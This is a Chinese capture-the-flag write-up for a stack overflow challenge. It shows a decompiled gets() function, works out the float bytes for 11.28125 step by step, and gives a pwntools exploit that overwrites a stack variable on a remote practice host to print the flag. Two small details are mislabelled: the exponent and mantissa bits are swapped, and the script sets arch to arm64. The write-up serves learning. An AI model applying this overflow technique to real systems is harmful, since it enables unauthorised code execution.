1. 漏洞函数：

   ```
   int func()
   {
     char v1[44]; // [rsp+0h] [rbp-30h] BYREF
     float v2; // [rsp+2Ch] [rbp-4h]
   
     v2 = 0.0;
     puts("Let's guess the number.");
     gets(v1);
     if ( v2 == 11.28125 )
       return system("cat /flag");
     else
       return puts("Its value should be 11.28125");
   }
   ```

2. 溢出到v2使v2=11.28125获取flag，复习以下float在内存中的形式：

   ```
   整数部分是8+2+1,0001011
   小数部分都是由2的负幂次组成的，一次乘2，得到：
   0.28125 * 2 = 0.5625，整数部分为0
   0.5625 * 2 = 1.125，整数部分为1
   0.125 * 2 = 0.25，整数部分为0
   0.25 * 2 = 0.5，整数部分为0
   0.5 * 2 = 1.0，整数部分为1
   01001
   ```

   1011.01001=1.01101001*(2^3)

   s=0 m=1000 0010 E=01101001

   0 1000 0010 01101001 000 0000 0000 0000

   0100 0001 0011 0100 1000 0000 0000 0000
   
   01000001 00110100 10000000 00000000
   
   41 34 80 00
   
   由于小端序，内存中为00 80 34 41

3. exp：在拼接字符串时，Python会自动进行编码转换。为了正确拼接字节序列，可以使用`bytes()`函数来创建一个字节序列

   ```python3
   from pwn import *
   
   context(os="linux", arch="arm64", log_level="debug")
   io = remote("node4.buuoj.cn", 27895)
   target = "01000001 00110100 10000000 00000000"
   target = target.split(' ')[::-1]
   target = b''.join(bytes([int(decimal, 2)]) for decimal in target)
   
   payload = b'a' * 0x2c + target
   io.sendlineafter(b"Let's guess the number.", payload)
   io.interactive()
   ```

   payload也可写成

   `payload += b'\x00\x80\x34\x41'`







